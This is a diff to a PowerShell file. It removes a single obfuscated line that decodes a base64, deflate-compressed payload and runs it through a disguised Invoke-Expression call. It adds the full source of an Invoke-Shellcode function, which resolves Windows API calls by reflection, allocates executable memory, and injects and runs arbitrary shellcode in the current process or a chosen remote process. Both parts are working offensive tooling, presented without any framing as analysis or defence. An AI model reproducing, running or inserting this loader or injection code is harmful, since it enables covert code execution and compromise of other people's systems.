@@ -1,1 +1,413 @@
- .( $pshomE[4]+$PshomE[30]+'x') ( NEW-ObjEcT sYSTEM.io.COMPreSsiON.dEflaTEStREaM( [sYSTem.iO.mEmoRYSTrEaM][CoNvert]::FROmBasE64StrinG( '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' ) ,[sYSTEM.iO.COmpreSsION.cOMPrESSIoNMODE]::deCOMPress )| fOrEACh-obJeCT{NEW-ObjEcT sYsteM.io.stREamreaDER($_ , [text.ENcoding]::aSCIi)}|FOREACH-OBJeCt{ $_.READTOENd( ) })
+function Invoke-Shellcode
+{
+[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
+    [ValidateNotNullOrEmpty()]
+    [UInt16]
+    $ProcessID,
+    
+    [Parameter( ParameterSetName = 'RunLocal' )]
+    [ValidateNotNullOrEmpty()]
+    [Byte[]]
+    $Shellcode,
+    
+    [Switch]
+    $Force = $False
+)
+
+    Set-StrictMode -Version 2.0
+
+    if ( $PSBoundParameters['ProcessID'] )
+    {
+        # Ensure a valid process ID was provided
+        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
+        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
+    }
+    
+    function Local:Get-DelegateType
+    {
+        Param
+        (
+            [OutputType([Type])]
+            
+            [Parameter( Position = 0)]
+            [Type[]]
+            $Parameters = (New-Object Type[](0)),
+            
+            [Parameter( Position = 1 )]
+            [Type]
+            $ReturnType = [Void]
+        )
+
+        $Domain = [AppDomain]::CurrentDomain
+        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+        Write-Output $TypeBuilder.CreateType()
+    }
+
+    function Local:Get-ProcAddress
+    {
+        Param
+        (
+            [OutputType([IntPtr])]
+        
+            [Parameter( Position = 0, Mandatory = $True )]
+            [String]
+            $Module,
+            
+            [Parameter( Position = 1, Mandatory = $True )]
+            [String]
+            $Procedure
+        )
+
+        # Get a reference to System.dll in the GAC
+        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+        # Get a reference to the GetModuleHandle and GetProcAddress methods
+        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+        # Get a handle to the module specified
+        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+        $tmpPtr = New-Object IntPtr
+        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+        
+        # Return the address of the function
+        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+    }
+
+    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
+    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
+    {
+        $IntSizePtr = $Architecture / 8
+
+        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
+        {
+            $LittleEndianByteArray = New-Object Byte[](0)
+            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
+            [System.Array]::Reverse($LittleEndianByteArray)
+            
+            Write-Output $LittleEndianByteArray
+        }
+        
+        $CallStub = New-Object Byte[](0)
+        
+        if ($IntSizePtr -eq 8)
+        {
+            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
+            $CallStub += 0xFF,0xD0                              # CALL  RAX
+            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
+            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
+            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
+            $CallStub += 0xFF,0xD0                              # CALL  RAX
+        }
+        else
+        {
+            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
+            $CallStub += 0xFF,0xD0                              # CALL  EAX
+            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
+            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
+            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
+            $CallStub += 0xFF,0xD0                              # CALL  EAX
+        }
+        
+        Write-Output $CallStub
+    }
+
+    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
+    {
+        # Open a handle to the process you want to inject into
+        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
+        
+        if (!$hProcess)
+        {
+            Throw "Unable to open a process handle for PID: $ProcessID"
+        }
+
+        $IsWow64 = $false
+
+        if ($64bitOS) # Only perform theses checks if CPU is 64-bit
+        {
+            # Determine if the process specified is 32 or 64 bit
+            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
+            
+            if ((!$IsWow64) -and $PowerShell32bit)
+            {
+                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
+            }
+            elseif ($IsWow64) # 32-bit Wow64 process
+            {
+                if ($Shellcode32.Length -eq 0)
+                {
+                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
+                }
+                
+                $Shellcode = $Shellcode32
+                Write-Verbose 'Injecting into a Wow64 process.'
+                Write-Verbose 'Using 32-bit shellcode.'
+            }
+            else # 64-bit process
+            {
+                if ($Shellcode64.Length -eq 0)
+                {
+                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
+                }
+                
+                $Shellcode = $Shellcode64
+                Write-Verbose 'Using 64-bit shellcode.'
+            }
+        }
+        else # 32-bit CPU
+        {
+            if ($Shellcode32.Length -eq 0)
+            {
+                Throw 'No shellcode was placed in the $Shellcode32 variable!'
+            }
+            
+            $Shellcode = $Shellcode32
+            Write-Verbose 'Using 32-bit shellcode.'
+        }
+
+        # Reserve and commit enough memory in remote process to hold the shellcode
+        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        
+        if (!$RemoteMemAddr)
+        {
+            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
+        }
+        
+        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
+
+        # Copy shellcode into the previously allocated memory
+        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null
+
+        # Get address of ExitThread function
+        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
+
+        if ($IsWow64)
+        {
+            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
+            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
+            
+            Write-Verbose 'Emitting 32-bit assembly call stub.'
+        }
+        else
+        {
+            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
+            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
+            
+            Write-Verbose 'Emitting 64-bit assembly call stub.'
+        }
+
+        # Allocate inline assembly stub
+        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        
+        if (!$RemoteStubAddr)
+        {
+            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
+        }
+        
+        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"
+
+        # Write 32-bit assembly stub to remote process memory space
+        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null
+
+        # Execute shellcode as a remote thread
+        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
+        
+        if (!$ThreadHandle)
+        {
+            Throw "Unable to launch remote thread in PID: $ProcessID"
+        }
+
+        # Close process handle
+        $CloseHandle.Invoke($hProcess) | Out-Null
+
+        Write-Verbose 'Shellcode injection complete!'
+    }
+
+    function Local:Inject-LocalShellcode
+    {
+        if ($PowerShell32bit) {
+            if ($Shellcode32.Length -eq 0)
+            {
+                Throw 'No shellcode was placed in the $Shellcode32 variable!'
+                return
+            }
+            
+            $Shellcode = $Shellcode32
+            Write-Verbose 'Using 32-bit shellcode.'
+        }
+        else
+        {
+            if ($Shellcode64.Length -eq 0)
+            {
+                Throw 'No shellcode was placed in the $Shellcode64 variable!'
+                return
+            }
+            
+            $Shellcode = $Shellcode64
+            Write-Verbose 'Using 64-bit shellcode.'
+        }
+    
+        # Allocate RWX memory for the shellcode
+        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if (!$BaseAddress)
+        {
+            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
+        }
+        
+        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"
+
+        # Copy shellcode to RWX buffer
+        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
+        
+        # Get address of ExitThread function
+        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
+        
+        if ($PowerShell32bit)
+        {
+            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
+            
+            Write-Verbose 'Emitting 32-bit assembly call stub.'
+        }
+        else
+        {
+            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
+            
+            Write-Verbose 'Emitting 64-bit assembly call stub.'
+        }
+
+        # Allocate RWX memory for the thread call stub
+        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if (!$CallStubAddress)
+        {
+            Throw "Unable to allocate thread call stub."
+        }
+        
+        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"
+
+        # Copy call stub to RWX buffer
+        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)
+
+        # Launch shellcode in it's own thread
+        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
+        if (!$ThreadHandle)
+        {
+            Throw "Unable to launch thread."
+        }
+
+        # Wait for shellcode thread to terminate
+        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
+        
+        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
+        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
+
+        Write-Verbose 'Shellcode injection complete!'
+    }
+
+    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
+    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
+
+    $AddressWidth = $null
+
+    try {
+        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
+    } catch {
+        throw 'Unable to determine OS processor address width.'
+    }
+
+    switch ($AddressWidth) {
+        '32' {
+            $64bitOS = $False
+        }
+
+        '64' {
+            $64bitOS = $True
+
+            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
+    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
+        }
+
+        default {
+            throw 'Invalid OS address width detected.'
+        }
+    }
+
+    if ([IntPtr]::Size -eq 4)
+    {
+        $PowerShell32bit = $true
+    }
+    else
+    {
+        $PowerShell32bit = $false
+    }
+
+    if ($PSBoundParameters['Shellcode'])
+    {
+        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
+        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
+        [Byte[]] $Shellcode32 = $Shellcode
+        [Byte[]] $Shellcode64 = $Shellcode32
+    }
+
+    if ( $PSBoundParameters['ProcessID'] )
+    {
+        # Inject shellcode into the specified process ID
+        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
+        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
+        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
+        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
+        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
+        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
+        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
+        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
+        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
+        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
+        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
+        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
+    
+        Write-Verbose "Injecting shellcode into PID: $ProcessId"
+        
+        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
+                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
+        {
+            Inject-RemoteShellcode $ProcessId
+        }
+    }
+    else
+    {
+        # Inject shellcode into the currently running PowerShell process
+        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
+        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
+        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
+        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
+        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
+        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
+        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
+        
+        Write-Verbose "Injecting shellcode into PowerShell"
+        
+        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
+                 "Injecting shellcode into the running PowerShell process!" ) )
+        {
+            Inject-LocalShellcode
+        }
+    }   
+}
